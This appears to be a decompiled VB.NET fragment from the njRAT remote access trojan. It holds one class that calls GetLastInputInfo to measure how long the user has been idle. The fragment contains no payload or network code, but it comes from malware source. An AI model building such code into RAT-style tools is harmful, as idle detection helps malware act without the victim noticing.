Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices

Namespace NJRAT
	' Token: 0x02000034 RID: 52
	Public NotInheritable Class GClass7
		' Token: 0x060005BA RID: 1466 RVA: 0x00145984 File Offset: 0x00143D84
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x060005BB RID: 1467
		Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef gstruct0_0 As GClass7.GStruct0) As Boolean

		' Token: 0x060005BC RID: 1468 RVA: 0x00145990 File Offset: 0x00143D90
		Public Shared Function smethod_0() As UInteger
			Dim gstruct As GClass7.GStruct0 = New GClass7.GStruct0() With { .uint_0 = Convert.ToUInt32(Marshal.SizeOf(gstruct)) }
			GClass7.GetLastInputInfo(gstruct)
			Return Convert.ToUInt32(Environment.TickCount) - gstruct.uint_1
		End Function

		' Token: 0x02000035 RID: 53
		Public Structure GStruct0
			' Token: 0x0400031D RID: 797
			Public uint_0 As UInteger

			' Token: 0x0400031E RID: 798
			Public uint_1 As UInteger
		End Structure
	End Class
End Namespace
